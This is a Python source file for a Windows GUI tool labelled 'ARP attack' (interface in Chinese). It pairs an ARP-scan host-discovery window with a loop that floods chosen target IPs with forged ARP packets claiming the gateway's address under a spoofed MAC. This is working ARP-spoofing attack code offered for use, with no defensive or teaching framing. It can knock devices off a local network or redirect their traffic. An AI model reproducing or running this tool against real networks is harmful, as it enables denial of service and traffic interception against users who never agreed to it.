import tkinter as tk
from win32api import MessageBox
from win32con import MB_ICONWARNING, MB_ICONASTERISK
from scapy.all import *
from threading import Thread


class PyWinDesign:
    def __init__(self, startwin):
        PyWinDesign.stop = 0
        PyWinDesign.running = 0

        def nmap():
            def startnmap1():
                global ipx, ip, i
                gateway = self.bj1x.get()
                maxscan = self.bj2x.get()
                if len(gateway) == 0 or len(maxscan) == 0:
                    MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                    return 0
                try:
                    maxscan = int(maxscan)
                except ValueError:
                    MessageBox(0, "输入错误!", "提示", MB_ICONWARNING)
                    return 0
                self.bt1x.config(state="disabled")
                gateway = gateway.split(".")
                gateway2 = gateway[0] + "." + gateway[1] + "." + gateway[2] + "."
                self.bq2bt = tk.StringVar()
                self.bq2bt.set('扫描中...')
                self.bq2x = tk.Label(root2, textvariable=self.bq2bt, anchor=tk.W)
                self.bq2x.place(x=140, y=90, width=50, height=24)
                try:
                    ip_list = []
                    for ipFix in range(0, maxscan+1):
                        ip = gateway2 + str(ipFix)
                        arpPkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
                        res = srp1(arpPkt, timeout=1, verbose=False)
                        if res:
                            ip_list.append(res.psrc)
                    ipx = ""
                    for i in ip_list:
                        ipx = ipx + i + "\n"
                    self.bq2x.destroy()
                    self.bt1x.config(state="normal")
                    MessageBox(0, "扫描结果:\n" + ipx, "提示", MB_ICONASTERISK)
                except:
                    self.bq2x.destroy()
                    self.bt1x.config(state="normal")
                    MessageBox(0, "出现未知错误", "错误", MB_ICONASTERISK)
                    return 0

            def startnmap():
                Thread(target=startnmap1, args=()).start()

            root2 = tk.Toplevel()
            screenwidth = root2.winfo_screenwidth()
            screenheight = root2.winfo_screenheight()
            size = '%dx%d+%d+%d' % (226, 122, (screenwidth - 226) / 2, (screenheight - 122) / 2)
            root2.geometry(size)
            root2.title("主机发现")

            self.bq1bt = tk.StringVar()
            self.bq1bt.set('网关')
            self.bq1 = tk.Label(root2, textvariable=self.bq1bt, anchor=tk.W)
            self.bq1.place(x=10, y=20, width=50, height=24)

            self.bj1nr = tk.StringVar()
            self.bj1nr.set('')
            self.bj1x = tk.Entry(root2, textvariable=self.bj1nr, justify=tk.LEFT)
            self.bj1x.place(x=57, y=23, width=125, height=20)

            self.bq2bt = tk.StringVar()
            self.bq2bt.set('扫描数')
            self.bq2 = tk.Label(root2, textvariable=self.bq2bt, anchor=tk.W)
            self.bq2.place(x=11, y=55, width=39, height=24)

            self.bj2nr = tk.StringVar()
            self.bj2nr.set('')
            self.bj2x = tk.Entry(root2, textvariable=self.bj2nr, justify=tk.LEFT)
            self.bj2x.place(x=58, y=57, width=125, height=20)

            self.bt1btx = tk.StringVar()
            self.bt1btx.set('扫描')
            self.bt1x = tk.Button(root2, textvariable=self.bt1btx, command=startnmap)
            self.bt1x.place(x=60, y=91, width=80, height=26)

        def stopatt():
            if PyWinDesign.running == 1:
                PyWinDesign.stop = 1

        def attack1():
            ipget = self.bj1.get(1.0, tk.END)
            gateway = self.bj2.get()
            if len(ipget) == 1 or len(gateway) == 0:
                MessageBox(0, "输入框不能为空!", "提示", MB_ICONWARNING)
                return 0
            ipsplit = ipget.split("\n")
            try:
                PyWinDesign.running = 1
                self.bq2bt = tk.StringVar()
                self.bq2bt.set('攻击中...')
                self.bq2x = tk.Label(self.startwin, textvariable=self.bq2bt, anchor=tk.W)
                self.bq2x.place(x=20, y=120, width=50, height=24)
                while True:
                    if PyWinDesign.stop == 1:
                        PyWinDesign.stop = 0
                        PyWinDesign.running = 0
                        self.bq2x.destroy()
                        break

                    for ipget2 in ipsplit:
                        sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src="2a:3a:02:03:4a:3a") / ARP(pdst=ipget2, psrc=gateway))
            except:
                PyWinDesign.running = 0
                self.bq2x.destroy()
                MessageBox(0, "出现未知错误", "提示", MB_ICONWARNING)
                return 0

        def attack():
            Thread(target=attack1, args=()).start()

        self.startwin = startwin
        self.startwin.title('ARP攻击')
        self.startwin.resizable(width=False, height=False)
        screenwidth = self.startwin.winfo_screenwidth()
        screenheight = self.startwin.winfo_screenheight()
        size = '%dx%d+%d+%d' % (243, 204, (screenwidth - 243) / 2, (screenheight - 204) / 2)
        self.startwin.geometry(size)

        self.bq1bt = tk.StringVar()
        self.bq1bt.set('IP')
        self.bq1 = tk.Label(self.startwin, textvariable=self.bq1bt, anchor=tk.W)
        self.bq1.place(x=25, y=21, width=17, height=22)

        self.bj1 = tk.Text(self.startwin, wrap=tk.NONE)
        self.bj1.insert(tk.END, '')
        self.bj1.place(x=50, y=21, width=120, height=64)

        self.bq2bt = tk.StringVar()
        self.bq2bt.set('网关')
        self.bq2 = tk.Label(self.startwin, textvariable=self.bq2bt, anchor=tk.W)
        self.bq2.place(x=20, y=93, width=30, height=24)

        self.bjbt = tk.StringVar()
        self.bjbt.set('')
        self.bj2 = tk.Entry(self.startwin, textvariable=self.bjbt, justify=tk.LEFT)
        self.bj2.place(x=53, y=98, width=117, height=20)

        self.bt1bt = tk.StringVar()
        self.bt1bt.set('开始')
        self.bt1 = tk.Button(self.startwin, textvariable=self.bt1bt, command=attack)
        self.bt1.place(x=35, y=146, width=69, height=28)

        self.bt2bt = tk.StringVar()
        self.bt2bt.set('结束')
        self.bt2 = tk.Button(self.startwin, textvariable=self.bt2bt, command=stopatt)
        self.bt2.place(x=126, y=146, width=69, height=28)

        self.bt2bt = tk.StringVar()
        self.bt2bt.set('主机发现')
        self.bt2 = tk.Button(self.startwin, textvariable=self.bt2bt, command=nmap)
        self.bt2.place(x=76, y=176, width=71, height=25)


if __name__ == '__main__':
    root = tk.Tk()
    app = PyWinDesign(root)
    root.mainloop()
